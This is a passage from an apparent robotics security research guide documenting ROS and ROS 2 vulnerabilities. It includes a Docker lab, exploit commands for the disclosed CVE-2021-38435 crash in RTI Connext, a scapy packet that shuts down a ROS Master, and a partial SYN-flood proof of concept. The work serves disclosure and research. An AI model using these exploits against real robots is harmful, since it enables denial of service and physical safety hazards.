    <span id="cb28-44"><a href="#cb28-44" aria-hidden="true" tabindex="-1"></a><span class="ex">[3]</span> id 16213 name publisher_lambd from 0x00007f2c8473f3f4 in futex_abstimed_wait_cancelable+42 at ../sysdeps/nptl/futex-internal.h:320</span>
    <span id="cb28-45"><a href="#cb28-45" aria-hidden="true" tabindex="-1"></a><span class="ex">[2]</span> id 16212 name publisher_lambd from 0x00007f2c8486712b in __GI___select+107 at ../sysdeps/unix/sysv/linux/select.c:41</span>
    <span id="cb28-46"><a href="#cb28-46" aria-hidden="true" tabindex="-1"></a><span class="ex">[1]</span> id 16170 name publisher_lambd from 0x00007f2c8473c7b1 in futex_abstimed_wait_cancelable+415 at ../sysdeps/nptl/futex-internal.h:320</span>
    <span id="cb28-47"><a href="#cb28-47" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Variables ────────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-48"><a href="#cb28-48" aria-hidden="true" tabindex="-1"></a><span class="ex">arg</span> sig = 6</span>
    <span id="cb28-49"><a href="#cb28-49" aria-hidden="true" tabindex="-1"></a><span class="ex">loc</span> set = {__val = {[0] = 18446744067266838239, [1] = 139829178189904, [2] = 4222451712, [3] = 139828901466080…, pid = <span class="op">&lt;</span>optimized out<span class="op">&gt;</span>, tid = <span class="op">&lt;</span>optimized out<span class="op">&gt;</span></span>
    <span id="cb28-50"><a href="#cb28-50" aria-hidden="true" tabindex="-1"></a><span class="ex">──────────────────────────────────────────────────────────────────────────────────────────────────</span></span></code></pre></div>
    <h3 id="credit">Credit</h3>
    <p>This research is the result of a cooperation among various security researchers and reported in <a href="https://us-cert.cisa.gov/ics/advisories/icsa-21-315-02">this advisory</a>. The following individuals too part on it (alphabetical order):</p>
    <ul>
    <li><a href="https://www.linkedin.com/in/chizuru-toyama-0a070427/">Chizuru Toyama</a></li>
    <li><a href="https://www.linkedin.com/in/erik-boasson-21344912/">Erik Boasson</a></li>
    <li><a href="https://www.linkedin.com/in/phretor">Federico Maggi</a></li>
    <li><a href="https://www.linkedin.com/in/marscheng93/">Mars Cheng</a></li>
    <li>Patrick Kuo</li>
    <li><a href="https://www.linkedin.com/in/evsfy/">Ta-Lun Yen</a></li>
    <li><a href="https://www.linkedin.com/in/vmayoral/">Víctor Mayoral-Vilches</a></li>
    </ul>
    <h2 id="turtlebot-3-tb3">TurtleBot 3 (TB3)</h2>
    <p>Building on top of the previous <a href="../2_ros2">ROS 2 case study</a>, this piece aims to demonstrate how ROS 2 vulnerabilities can be translated directly into complete robots and how attackers could exploit them.</p>
    <h3 id="dockerized-environment">Dockerized environment</h3>
    <p>Like in previous cases, when possible, we’ll facilitate a Docker-based environment so that you can try things out yourself! Here’s this one:</p>
    <p><strong>NOTE</strong>: RTI Connext setup process has been commented so you’ll need to go ahead, uncomment that block in the Dockerfile and build at your own risk.</p>
    <div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Build</span></span>
    <span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> hacking_tb3:foxy <span class="at">--build-arg</span> DISTRO=foxy .</span>
    <span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Run headless</span></span>
    <span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> hacking_tb3:foxy <span class="at">-c</span> <span class="st">&quot;/bin/bash&quot;</span></span>
    <span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Run headless with byobu config using both Fast-DDS and RTI&#39;s Connext</span></span>
    <span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> hacking_tb3:foxy <span class="at">-c</span> <span class="st">&quot;/usr/bin/byobu -f /opt/configs/pocs_headless_connext.conf attach&quot;</span></span>
    <span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Run headless sharing host&#39;s network</span></span>
    <span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> <span class="at">--privileged</span> <span class="at">--net</span><span class="op">=</span>host hacking_tb3:foxy <span class="at">-c</span> <span class="st">&quot;/usr/bin/byobu -f /opt/configs/pocs_headless.conf attach&quot;</span></span>
    <span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Run headless sharing host&#39;s network, and with some nodes launched using OpenDDS</span></span>
    <span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> <span class="at">--privileged</span> <span class="at">--net</span><span class="op">=</span>host hacking_tb3:foxy <span class="at">-c</span> <span class="st">&quot;/usr/bin/byobu -f /opt/configs/pocs_headless_opendds.conf attach&quot;</span></span>
    <span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb29-16"><a href="#cb29-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb29-17"><a href="#cb29-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Run, using X11</span></span>
    <span id="cb29-18"><a href="#cb29-18" aria-hidden="true" tabindex="-1"></a><span class="fu">xhost</span> + <span class="co"># (careful with this)</span></span>
    <span id="cb29-19"><a href="#cb29-19" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> <span class="at">-v</span> /tmp/.X11-unix:/tmp/.X11-unix <span class="at">-e</span> DISPLAY=<span class="va">$DISPLAY</span> <span class="at">-v</span> <span class="va">$HOME</span>/.Xauthority:/home/xilinx/.Xauthority hacking_tb3:foxy <span class="at">-c</span> <span class="st">&quot;/usr/bin/byobu -f /opt/configs/pocs_connext.conf attach&quot;</span></span></code></pre></div>
    <h3 id="searching-for-tb3s-around-reconnaissance">Searching for TB3s around (reconnaissance)</h3>
    <div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> exploits/footprint.py <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span></code></pre></div>
    <p>It’ll find the CycloneDDS node <code>teleop_keyboard</code>, which respond to the crafted package and identify the corresponding endpoint.</p>
    <h3 id="messing-up-with-tb3s-traffic">Messing up with TB3’s traffic</h3>
    <p><img src="../../images/2021/tb3_reflection.gif" /></p>
    <div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> exploits/reflection.py <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span></code></pre></div>
    <h3 id="crashing-tb3s-running-best-in-the-world-dds-rti-connext">Crashing TB3s running “best in the world” DDS: RTI Connext</h3>
    <p><img src="../../images/2021/connext_crasher.png" /></p>
    <figure>
    <embed src="images/2021/connext_crasher.pdf" /><figcaption aria-hidden="true">An RTPS package with an incorrect parameterLength</figcaption>
    </figure>
    <p>Real Time Innovations (RTI) is one of the leading DDS vendors. They claim to have customers across use cases in medical, aerospace, industry and military. They throw periodic webinars about security however beyond these marketing actions, their practices and security-awareness don’t seem to live up to the security industry standards. This section will demonstrate how to exploit the already disclosed CVE-2021-38435 in the TurtleBot 3 with RTI Connext, which <a href="https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071">RTI decided not to credit back to the original security researchers</a> (us 😜).</p>
    <p>Out of the research we reported the following can be extracted:</p>
    <table>
    <colgroup>
    <col style="width: 16%" />
    <col style="width: 26%" />
    <col style="width: 20%" />
    <col style="width: 20%" />
    <col style="width: 16%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th>CVE ID</th>
    <th>Description</th>
    <th>Scope</th>
    <th>CVSS</th>
    <th>Notes</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td>CVE-2021-38435</td>
    <td>RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later do not correctly calculate the size when allocating the buffer, which may result in a buffer overflow</td>
    <td>ConnextDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H">8.6</a></td>
    <td>Segmentation fault via network <a href="https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071">&gt;= 6.1.0</a></td>
    </tr>
    </tbody>
    </table>
    <p>The security flaw in this case affects solely RTI Connext DDS and is a segmentation fault caused by a <a href="exploits/crash_connext.py">malformed RTPS packet</a> which can be triggered remotely over the network.</p>
    <p>In a nutshell, Connext serializer in RTI Connext throws an error while digesting this package, which leads the corresponding ROS 2 Node to exit immediately, causing denial of service. In addition, depending on the Node’s computations, it may also lead to safety issues due to the fact that the communication is interrupted immediately. The flaw affects both publishers and subscribers, and an attacker could selectively <em>crash</em> specific Nodes which may compromise the robot computational graph for achieving <em>beyond-DoS</em> malicious objectives.</p>
    <p>The interest of this flaw is that <ins>it somewhat shows how easy it is to compromise a computational graph built with the <em>best in the world</em> DDS solution😓 </ins> (see screenshot from RTI Connext’s site below, their words):</p>
    <figure>
    <img src="../../images/2021/rti_connext.png" alt="RTI Connext’s website claim to be the “best in the world” at connecting intelligent, distributed systems." /><figcaption aria-hidden="true">RTI Connext’s website claim to be the “best in the world” at connecting intelligent, distributed systems.</figcaption>
    </figure>
    <p>The following clip depicts how the flaw is exploited in a simulated TurtleBot 3 robot. Note how the teleoperation Node is first launched and stopped, demonstrating how the corresponding topics’ velocity values are set to zero after the Node finishes. This avoids the robot to move in an undesired manner. If <em>instead of stopping the teleoperation Node manually, we crash it using CVE-2021-38435</em>, we can observe how the last velocities are kept infinitely, leading to robot to crash into the wall.</p>
    <figure>
    <img src="../../images/2021/tb3_connext_simulation.gif" alt="Demonstration of CVE-2021-38435 in a simulated TurtleBot 3" /><figcaption aria-hidden="true">Demonstration of CVE-2021-38435 in a simulated TurtleBot 3</figcaption>
    </figure>
    <h3 id="crashing-a-simple-ros-2-node-with-rtis-connext-dds">Crashing a simple ROS 2 Node with RTI’s Connext DDS</h3>
    <p>Here’s a simpler PoC that launches a ROS 2 publisher which is then crashed by also exploiting CVE-2021-38435:</p>
    <p><a href="https://asciinema.org/a/451837"><img src="https://asciinema.org/a/451837.svg" alt="CVE-2021-38435: RTI’s Connext ROS 2 Node hacking" /></a></p>
    <div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="co"># split 1</span></span>
    <span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> hacking_tb3:foxy <span class="at">-c</span> <span class="st">&quot;/bin/bash&quot;</span></span>
    <span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="va">RMW_IMPLEMENTATION</span><span class="op">=</span>rmw_connext_cpp <span class="ex">ros2</span> run demo_nodes_cpp talker</span>
    <span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="co"># split 2</span></span>
    <span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3 exploits/crash_connext.py <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span></code></pre></div>
    <h3 id="credit-1">Credit</h3>
    <p>Part of this research is the result of a cooperation among various security researchers across groups as reported in <a href="https://us-cert.cisa.gov/ics/advisories/icsa-21-315-02">this advisory</a>. The following individuals took part on it (alphabetical order):</p>
    <ul>
    <li><a href="https://www.linkedin.com/in/chizuru-toyama-0a070427/">Chizuru Toyama</a></li>
    <li><a href="https://www.linkedin.com/in/erik-boasson-21344912/">Erik Boasson</a></li>
    <li><a href="https://www.linkedin.com/in/phretor">Federico Maggi</a></li>
    <li><a href="https://www.linkedin.com/in/marscheng93/">Mars Cheng</a></li>
    <li>Patrick Kuo</li>
    <li><a href="https://www.linkedin.com/in/evsfy/">Ta-Lun Yen</a></li>
    <li><a href="https://www.linkedin.com/in/vmayoral/">Víctor Mayoral-Vilches</a></li>
    </ul>
    <h2 id="robot-operating-system-ros-1-1">Robot Operating System (ROS 1)</h2>
    <p>The Robot Operating System (ROS) is the de <em>facto</em> standard for robot application development <span class="citation" data-cites="Quigley09">(<a href="#ref-Quigley09" role="doc-biblioref">Quigley, Gerkey, et al. 2009</a>)</span>. It’s a framework for creating robot behaviors that comprises various stacks and capabilities for message passing, perception, navigation, manipulation or security, among others. It’s <a href="https://www.businesswire.com/news/home/20190516005135/en/Rise-ROS-55-total-commercial-robots-shipped">estimated</a> that by 2024, 55% of the total commercial robots will be shipping at least one ROS package. <strong>ROS is to roboticists what Linux is to computer scientists</strong>.</p>
    <p>This case study will analyze the security of ROS and demonstrate a few security flaws that made the community jump into a more robust evolution: ROS 2<span class="sidenote-wrapper"><label for="sn-19" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-19" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span> (see <a href="../2_ros2/">case study on ROS 2</a>)</p>
    <h3 id="dissecting-ros-network-interactions-through-scapy-1">Dissecting ROS network interactions through scapy</h3>
    <p>TCPROS is a transport layer for ROS Messages and Services. It uses standard TCP/IP sockets for transporting message data. Inbound connections are received via a TCP Server Socket with a header containing message data type and routing information. This class focuses on capturing the ROS Slave API.</p>
    <p>Until it gets merged upstream (see <a href="https://github.com/secdev/scapy/pull/3462">TCPROS PR</a>), you can get the TCPROS dissector as follows:</p>
    <div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pip3</span> install git+https://github.com/vmayoral/scapy@tcpros</span></code></pre></div>
    <p>An example package is presented below:</p>
    <p><img src="../../images/2021/ros_shutdown.png" /></p>
    <div class="sourceCode" id="cb34"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.contrib.tcpros <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a>bind_layers(TCP, TCPROS)</span>
    <span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a>bind_layers(HTTPRequest, XMLRPC)</span>
    <span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a>bind_layers(HTTPResponse, XMLRPC)</span>
    <span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a>pkt <span class="op">=</span>   <span class="st">b&quot;POST /RPC2 HTTP/1.1</span><span class="ch">\r\n</span><span class="st">Accept-Encoding: gzip</span><span class="ch">\r\n</span><span class="st">Content-Length: &quot;</span> \</span>
    <span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;227</span><span class="ch">\r\n</span><span class="st">Content-Type: text/xml</span><span class="ch">\r\n</span><span class="st">Host: 12.0.0.2:11311</span><span class="ch">\r\n</span><span class="st">User-Agent:&quot;</span> \</span>
    <span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;xmlrpclib.py/1.0.1 (by www.pythonware.com)</span><span class="ch">\r\n\r\n</span><span class="st">&lt;?xml version=&quot;</span> \</span>
    <span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;&#39;1.0&#39;?&gt;</span><span class="ch">\n</span><span class="st">&lt;methodCall&gt;</span><span class="ch">\n</span><span class="st">&lt;methodName&gt;shutdown&lt;/methodName&gt;</span><span class="ch">\n</span><span class="st">&lt;params&gt;&quot;</span> \</span>
    <span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;</span><span class="ch">\n</span><span class="st">&lt;param&gt;</span><span class="ch">\n</span><span class="st">&lt;value&gt;&lt;string&gt;/rosparam-92418&lt;/string&gt;&lt;/value&gt;</span><span class="ch">\n</span><span class="st">&quot;</span> \</span>
    <span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;&lt;/param&gt;</span><span class="ch">\n</span><span class="st">&lt;param&gt;</span><span class="ch">\n</span><span class="st">&lt;value&gt;&lt;string&gt;BOOM&lt;/string&gt;&lt;/value&gt;&quot;</span> \</span>
    <span id="cb34-12"><a href="#cb34-12" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;</span><span class="ch">\n</span><span class="st">&lt;/param&gt;</span><span class="ch">\n</span><span class="st">&lt;/params&gt;</span><span class="ch">\n</span><span class="st">&lt;/methodCall&gt;</span><span class="ch">\n</span><span class="st">&quot;</span></span>
    <span id="cb34-13"><a href="#cb34-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb34-14"><a href="#cb34-14" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> TCPROS(pkt)</span></code></pre></div>
    <p>or alternatively, crafting it layer by layer:</p>
    <div class="sourceCode" id="cb35"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> (</span>
    <span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a>    IP(version<span class="op">=</span><span class="dv">4</span>, ihl<span class="op">=</span><span class="dv">5</span>, tos<span class="op">=</span><span class="dv">0</span>, flags<span class="op">=</span><span class="dv">2</span>, dst<span class="op">=</span><span class="st">&quot;12.0.0.2&quot;</span>)</span>
    <span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> TCP(</span>
    <span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a>        sport<span class="op">=</span><span class="dv">20001</span>,</span>
    <span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a>        dport<span class="op">=</span><span class="dv">11311</span>,</span>
    <span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a>        seq<span class="op">=</span><span class="dv">1</span>,</span>
    <span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a>        flags<span class="op">=</span><span class="st">&quot;PA&quot;</span>,</span>
    <span id="cb35-8"><a href="#cb35-8" aria-hidden="true" tabindex="-1"></a>        ack<span class="op">=</span><span class="dv">1</span>,</span>
    <span id="cb35-9"><a href="#cb35-9" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb35-10"><a href="#cb35-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> TCPROS()</span>
    <span id="cb35-11"><a href="#cb35-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> HTTP()</span>
    <span id="cb35-12"><a href="#cb35-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> HTTPRequest(</span>
    <span id="cb35-13"><a href="#cb35-13" aria-hidden="true" tabindex="-1"></a>        Accept_Encoding<span class="op">=</span><span class="st">b&quot;gzip&quot;</span>,</span>
    <span id="cb35-14"><a href="#cb35-14" aria-hidden="true" tabindex="-1"></a>        Content_Length<span class="op">=</span><span class="st">b&quot;227&quot;</span>,</span>
    <span id="cb35-15"><a href="#cb35-15" aria-hidden="true" tabindex="-1"></a>        Content_Type<span class="op">=</span><span class="st">b&quot;text/xml&quot;</span>,</span>
    <span id="cb35-16"><a href="#cb35-16" aria-hidden="true" tabindex="-1"></a>        Host<span class="op">=</span><span class="st">b&quot;12.0.0.2:11311&quot;</span>,</span>
    <span id="cb35-17"><a href="#cb35-17" aria-hidden="true" tabindex="-1"></a>        User_Agent<span class="op">=</span><span class="st">b&quot;xmlrpclib.py/1.0.1 (by www.pythonware.com)&quot;</span>,</span>
    <span id="cb35-18"><a href="#cb35-18" aria-hidden="true" tabindex="-1"></a>        Method<span class="op">=</span><span class="st">b&quot;POST&quot;</span>,</span>
    <span id="cb35-19"><a href="#cb35-19" aria-hidden="true" tabindex="-1"></a>        Path<span class="op">=</span><span class="st">b&quot;/RPC2&quot;</span>,</span>
    <span id="cb35-20"><a href="#cb35-20" aria-hidden="true" tabindex="-1"></a>        Http_Version<span class="op">=</span><span class="st">b&quot;HTTP/1.1&quot;</span>,</span>
    <span id="cb35-21"><a href="#cb35-21" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb35-22"><a href="#cb35-22" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> XMLRPC()</span>
    <span id="cb35-23"><a href="#cb35-23" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> XMLRPCCall(</span>
    <span id="cb35-24"><a href="#cb35-24" aria-hidden="true" tabindex="-1"></a>        version<span class="op">=</span><span class="st">b&quot;&lt;?xml version=&#39;1.0&#39;?&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb35-25"><a href="#cb35-25" aria-hidden="true" tabindex="-1"></a>        methodcall_opentag<span class="op">=</span><span class="st">b&quot;&lt;methodCall&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb35-26"><a href="#cb35-26" aria-hidden="true" tabindex="-1"></a>        methodname_opentag<span class="op">=</span><span class="st">b&quot;&lt;methodName&gt;&quot;</span>,</span>
    <span id="cb35-27"><a href="#cb35-27" aria-hidden="true" tabindex="-1"></a>        methodname<span class="op">=</span><span class="st">b&quot;shutdown&quot;</span>,</span>
    <span id="cb35-28"><a href="#cb35-28" aria-hidden="true" tabindex="-1"></a>        methodname_closetag<span class="op">=</span><span class="st">b&quot;&lt;/methodName&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb35-29"><a href="#cb35-29" aria-hidden="true" tabindex="-1"></a>        params_opentag<span class="op">=</span><span class="st">b&quot;&lt;params&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb35-30"><a href="#cb35-30" aria-hidden="true" tabindex="-1"></a>        params<span class="op">=</span><span class="st">b&quot;&lt;param&gt;</span><span class="ch">\n</span><span class="st">&lt;value&gt;&lt;string&gt;/rosparam-92418&lt;/string&gt;&lt;/value&gt;</span><span class="ch">\n</span><span class="st">&lt;/param&gt;</span><span class="ch">\n</span><span class="st">&lt;param&gt;</span><span class="ch">\n</span><span class="st">&lt;value&gt;&lt;string&gt;BOOM&lt;/string&gt;&lt;/value&gt;</span><span class="ch">\n</span><span class="st">&lt;/param&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb35-31"><a href="#cb35-31" aria-hidden="true" tabindex="-1"></a>        params_closetag<span class="op">=</span><span class="st">b&quot;&lt;/params&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb35-32"><a href="#cb35-32" aria-hidden="true" tabindex="-1"></a>        methodcall_closetag<span class="op">=</span><span class="st">b&quot;&lt;/methodCall&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb35-33"><a href="#cb35-33" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb35-34"><a href="#cb35-34" aria-hidden="true" tabindex="-1"></a>)</span></code></pre></div>
    <p>This package will invoke the <code>shutdown</code> method of ROS 2 Master, shutting it down, together with all its associated Nodes.</p>
    <p>Let’s take a look at other potential attacks against ROS.</p>
    <h3 id="syn-ack-dos-flooding-attack-for-ros-1">SYN-ACK DoS flooding attack for ROS</h3>
    <p>A SYN flood is a type of OSI Level 4 (Transport Layer) network attack. The basic idea is to keep a server busy with idle connections, resulting in a a Denial-of-Service (DoS) via a maxed-out number of connections. Roughly, the attack works as follows:</p>
    <ul>
    <li>the client sends a TCP <code>SYN</code> (<code>S</code> flag) packet to begin a connection with a given end-point (e.g. a server).</li>
    <li>the server responds with a <code>SYN-ACK</code> packet, particularly with a TCP <code>SYN-ACK</code> (<code>SA</code> flag) packet.</li>
    <li>the client responds back with an <code>ACK</code> (flag) packet. In normal operation, the client should send an <code>ACK</code> packet followed by the data to be transferred, or a <code>RST</code> reply to reset the connection. On the target server, the connection is kept open, in a <code>SYN_RECV</code> state, as the <code>ACK</code> packet may have been lost due to network problems.</li>
    <li>In the attack, to abuse this handshake process, an attacker can send a <em>SYN Flood</em>, a flood of <code>SYN</code> packets, and do nothing when the server responds with a <code>SYN-ACK</code> packet. The server politely waits for the other end to respond with an <code>ACK</code> packet, and because bandwidth is fixed, the hardware only has a fixed number of connections it can make. Eventually, the SYN packets max out the available connections to a server with hanging connections. New sockets will experience a denial of service.</li>
    </ul>
    <p>A proof-of-concept attack was developed on the simulated target scenario (above) to isolate communications. The attack exploit is displayed below:</p>
    <div class="sourceCode" id="cb36"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">&quot;Capturing network traffic...&quot;</span>)</span>
    <span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a>packages <span class="op">=</span> sniff(iface<span class="op">=</span><span class="st">&quot;eth0&quot;</span>, <span class="bu">filter</span><span class="op">=</span><span class="st">&quot;tcp&quot;</span>, count<span class="op">=</span><span class="dv">20</span>)</span>
    <span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a>targets <span class="op">=</span> {}</span>
    <span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> p <span class="kw">in</span> packages[TCPROSBody]:</span>
    <span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Filter by ip</span></span>
    <span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a>    <span class="co"># if p[IP].src == &quot;12.0.0.2&quot;:</span></span>
    <span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a>    port <span class="op">=</span> p.sport</span>
    <span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a>    ip <span class="op">=</span> p[IP].src</span>
    <span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ip <span class="kw">in</span> targets.keys():</span>
    <span id="cb36-10"><a href="#cb36-10" aria-hidden="true" tabindex="-1"></a>        targets[ip].append(port)</span>
    <span id="cb36-11"><a href="#cb36-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
    <span id="cb36-12"><a href="#cb36-12" aria-hidden="true" tabindex="-1"></a>        targets[ip] <span class="op">=</span> [port]</span>
    <span id="cb36-13"><a href="#cb36-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb36-14"><a href="#cb36-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Get unique values:</span></span>
    <span id="cb36-15"><a href="#cb36-15" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> t <span class="kw">in</span> targets.keys():</span>
    <span id="cb36-16"><a href="#cb36-16" aria-hidden="true" tabindex="-1"></a>    targets[t] <span class="op">=</span> <span class="bu">list</span>(<span class="bu">set</span>(targets[t]))</span>
    <span id="cb36-17"><a href="#cb36-17" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb36-18"><a href="#cb36-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Select one of the targets</span></span>
    <span id="cb36-19"><a href="#cb36-19" aria-hidden="true" tabindex="-1"></a>dst_target <span class="op">=</span> <span class="bu">list</span>(<span class="bu">map</span>(itemgetter(<span class="dv">0</span>), targets.items()))[<span class="dv">0</span>]</span>
    <span id="cb36-20"><a href="#cb36-20" aria-hidden="true" tabindex="-1"></a>dport_target <span class="op">=</span> targets[dst_target]</span>
    <span id="cb36-21"><a href="#cb36-21" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb36-22"><a href="#cb36-22" aria-hidden="true" tabindex="-1"></a><span class="co"># Small fix to meet scapy syntax on &quot;dport&quot; key</span></span>
    <span id="cb36-23"><a href="#cb36-23" aria-hidden="true" tabindex="-1"></a><span class="co">#  if single value, can&#39;t go as a list</span></span>
    <span id="cb36-24"><a href="#cb36-24" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="bu">len</span>(dport_target) <span class="op">&lt;</span> <span class="dv">2</span>:</span>
    <span id="cb36-25"><a href="#cb36-25" aria-hidden="true" tabindex="-1"></a>    dport_target <span class="op">=</span> dport_target[<span class="dv">0</span>]</span>
    <span id="cb36-26"><a href="#cb36-26" aria-hidden="true" tabindex="-1"></a></span>
